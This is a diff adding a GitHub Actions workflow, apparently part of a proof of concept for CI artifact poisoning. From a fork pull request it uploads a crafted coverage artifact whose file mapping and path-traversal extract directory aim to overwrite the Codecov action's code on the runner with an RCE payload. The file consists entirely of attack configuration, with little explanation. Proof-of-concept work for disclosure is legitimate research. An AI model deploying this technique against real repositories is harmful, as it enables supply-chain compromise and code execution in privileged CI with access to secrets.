@@ -1,0 +1,22 @@
+name: attacker-ci
+# Simulates the fork PR author's own CI: runs in the base repo on a pull_request
+# event (read-only token, no secrets) and uploads a crafted artifact.
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install artifact client
+        working-directory: .github/actions/plant
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: Upload crafted coverage artifact
+        uses: ./.github/actions/plant
+        env:
+          INPUT_EXTRACT_DIR: "../gab-poc-snapshot/gab-poc-snapshot/coverage-report-ubuntu-latest-20.x"
+        with:
+          name: coverage-report-ubuntu-latest-20.x
+          pairs: "poc-payload/codecov-rce.js->/home/runner/work/_actions/codecov/codecov-action/v4/dist/index.js"
